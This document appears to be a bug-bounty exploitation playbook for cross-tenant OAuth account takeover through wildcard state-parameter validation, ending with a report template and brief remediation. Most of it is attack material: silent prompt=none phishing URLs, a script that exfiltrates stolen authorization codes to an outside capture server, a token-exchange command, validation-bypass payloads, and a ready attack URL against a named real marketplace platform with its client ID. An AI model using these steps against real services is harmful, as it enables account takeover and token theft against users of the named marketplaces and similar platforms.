---
tags:
  - critical
---

# OAuth Wildcard State Validation → Cross-Tenant ATO

Shared OAuth infrastructure with wildcard subdomain allowlists enables cross-tenant authorization code theft.

## Overview

```
Shared OAuth IdP (all tenants share one client)
    → State param contains target URL
    → Callback server validates URL against *.saas-platform.com
    → Attacker controls a tenant → attacker-tenant.saas-platform.com
    → Routes auth code to attacker → ATO
```

**Real-world pattern:** SaaS platforms where all customer tenants share a single OAuth application (Auth0, Okta, Cognito). The OAuth relay server validates `state` against a wildcard allowlist. Any tenant marketplace becomes a valid redirect target.

---

## The Architecture

```
User → Tenant A (legit)
User → [Shared IdP] (Auth0/Okta) → login
IdP  → [OAuth relay] redirect.saas.com
relay → validates state URL against allowlist
relay → redirects code to state URL (tenant)
```

**Vulnerable state format:**
```
state=https://tenant.saas.com/callback|context
state={"target":"https://tenant.saas.com","nonce":"xyz"}
state=dGVuYW50LnNhYXMuY29t  # base64 encoded URL
```

---

## Step-by-Step Exploitation

### 1. Identify the Pattern

```bash
# Start OAuth flow, intercept the authorization request
GET /authorize?
  client_id=SHARED_CLIENT_ID&
  redirect_uri=https://relay.saas.com&
  state=https://tenant-a.saas.com/callback|ctx&
  response_type=code&
  scope=openid email

# The state contains a URL → wildcard validation likely
```

### 2. Enumerate Your Attacker Domain

```bash
# You need control of a *.saas.com subdomain
# Options:
# - Register a tenant/marketplace account on the platform
# - Find a subdomain takeover on a saas.com subdomain
# - Find an open redirect on any existing tenant
```

### 3. Test the Wildcard Validation

```bash
# Test: does the relay forward to any *.saas.com?
curl -D - --max-redirs 0 \
  "https://relay.saas.com/callback?code=TEST&state=https://attacker-tenant.saas.com/steal%7Cctx"

# Vulnerable response:
# HTTP/1.1 302 Found
# Location: https://attacker-tenant.saas.com/steal?code=TEST&...

# vs. blocked:
# HTTP/1.1 400 Bad Request
# {"error": "invalid_state"}
```

### 4. Silent Phishing (prompt=none)

```bash
# If IdP has active session → no user interaction needed
# Craft the attack URL:
https://idp.saas.com/authorize?
  client_id=SHARED_CLIENT_ID&
  redirect_uri=https://relay.saas.com&
  scope=openid+email&
  response_type=code&
  prompt=none&
  state=https://attacker-tenant.saas.com/steal|none

# prompt=none = silent auth, no login screen
# If victim has active session → code sent silently
```

### 5. Steal the Authorization Code

```html
<!-- Set up endpoint on your tenant/subdomain -->
<!-- /steal endpoint captures ?code= -->
<script>
// Log or forward the code
const code = new URLSearchParams(location.search).get('code');
fetch('https://your-server.com/capture?code=' + code);
</script>
```

### 6. Exchange Code for Token

```bash
# Exchange stolen code
curl -X POST "https://idp.saas.com/oauth/token" \
  -d "grant_type=authorization_code" \
  -d "client_id=SHARED_CLIENT_ID" \
  -d "code=STOLEN_CODE" \
  -d "redirect_uri=https://relay.saas.com"

# Get: access_token, id_token, refresh_token
# Use: authenticate as victim on any tenant
```

---

## Real Example: Mirakl (2026)

All Mirakl marketplace tenants share a single Auth0 app:
- **Client ID:** `UNPB4KbSz10ZExFyRsNQ6JHbKBeW94nq` (public)
- **Fixed redirect_uri:** `https://redirect.mirakl.net`
- **State format:** `{URL}|{context}` (URL validated against `*.mirakl.net`)

```bash
# Attack URL (any victim with active Mirakl session)
https://login.mirakl.net/authorize?
  response_type=code&
  client_id=UNPB4KbSz10ZExFyRsNQ6JHbKBeW94nq&
  redirect_uri=https://redirect.mirakl.net&
  scope=openid%20email&
  state=https://attacker-tenant.mirakl.net/steal|none&
  prompt=none

# redirect.mirakl.net validates state → attacker-tenant.mirakl.net ✓ (in allowlist)
# Routes code to attacker → ATO across ALL Mirakl-powered marketplaces
```

**Severity:** Critical — affects all customers of Cdiscount, La Fnac, and 300+ other Mirakl-powered marketplaces.

---

## Variations

### Variation 1: JSON State Payload

```bash
# State as JSON object
state={"redirect":"https://attacker-tenant.saas.com","nonce":"x"}

# URL-encoded
state=%7B%22redirect%22%3A%22https%3A%2F%2Fattacker-tenant.saas.com%22%7D
```

### Variation 2: Open Redirect Chaining

```bash
# If you don't control a *.saas.com subdomain:
# Find an open redirect on any tenant
state=https://victim-tenant.saas.com/redirect?url=https://attacker.com

# Relay validates → victim-tenant.saas.com ✓
# Open redirect sends code to attacker.com
```

### Variation 3: Subdomain Takeover

```bash
# Find unclaimed subdomains of saas.com
# Claim the subdomain (dangling CNAME)
# Now you "control" a *.saas.com subdomain
# Use it as the redirect target in state
```

### Variation 4: Weak Validation (startsWith / endsWith)

```bash
# Validation: state URL must start with https://saas.com
state=https://saas.com.attacker.com  # passes startsWith!

# Validation: state URL must contain saas.com
state=https://attacker.com?saas.com  # passes contains!
state=https://attacker.com#saas.com  # passes contains!
```

---

## Detection Checklist

- [ ] Does the state parameter contain a URL?
- [ ] Does the relay/callback server redirect based on state URL?
- [ ] Test: does any `*.target.com` work as state URL?
- [ ] Do you (or can you get) control of a `*.target.com` subdomain?
- [ ] Does `prompt=none` work for silent auth?
- [ ] Check state validation: `startsWith`, `endsWith`, `contains`, wildcard regex
- [ ] Look for open redirects on any tenant (chaining)
- [ ] Check if state is validated BEFORE or AFTER code exchange

---

## Hunting Tips

```bash
# 1. Find the shared OAuth client ID
# Check any tenant's authorization URL
curl -sI "https://tenant-a.saas.com/login/oauth" | grep location

# 2. Decode state to understand format
echo "STATE_VALUE" | base64 -d
python3 -c "import urllib.parse,sys; print(urllib.parse.unquote(sys.argv[1]))" "STATE_VALUE"

# 3. Test relay directly (no auth needed for redirect test)
curl -D - --max-redirs 0 \
  "https://relay.saas.com/callback?code=FAKE&state=https://your-tenant.saas.com/test%7Cctx"

# 4. Check OIDC discovery for relay hints
curl https://idp.saas.com/.well-known/openid-configuration | jq .
```

---

## Impact Assessment

| Factor | Description |
|--------|-------------|
| **Scope** | All users sharing the OAuth infrastructure |
| **Interaction** | Zero-click if `prompt=none` + active session |
| **Persistence** | Refresh tokens → long-term access |
| **Multi-tenant** | Works across all customer organizations |

**CVSS v3.1:** `AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:N` = **9.3 Critical**

---

## Report Template

```
## Summary
OAuth state parameter validation allows any *.saas.com subdomain to receive
authorization codes. An attacker controlling a tenant can steal codes from
any user with an active session.

## Impact
- All [N] customers sharing the OAuth infrastructure are affected
- Silent exploitation possible via prompt=none (no user interaction)
- Full account takeover on all tenants

## Severity: Critical
CVSS: 9.3 (AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:N)
CWE: CWE-601 (Open Redirect) + CWE-346 (Origin Validation Error)

## Steps to Reproduce
1. Register a tenant account to control *.saas.com subdomain
2. Craft OAuth URL with state pointing to your tenant + prompt=none
3. Victim with active session clicks link → silent code delivery
4. Exchange code → full ATO

## Remediation
- Validate state URL against an exact allowlist (not wildcard)
- Use opaque random state (not a URL) + server-side session mapping
- Implement PKCE (code_challenge) to prevent code interception
```

---

*Related: [OAuth to ATO](oauth-to-ato.md) | [CORS + Subdomain](oauth-to-ato.md#chain-8-cors--subdomain--oauth-token-theft)*
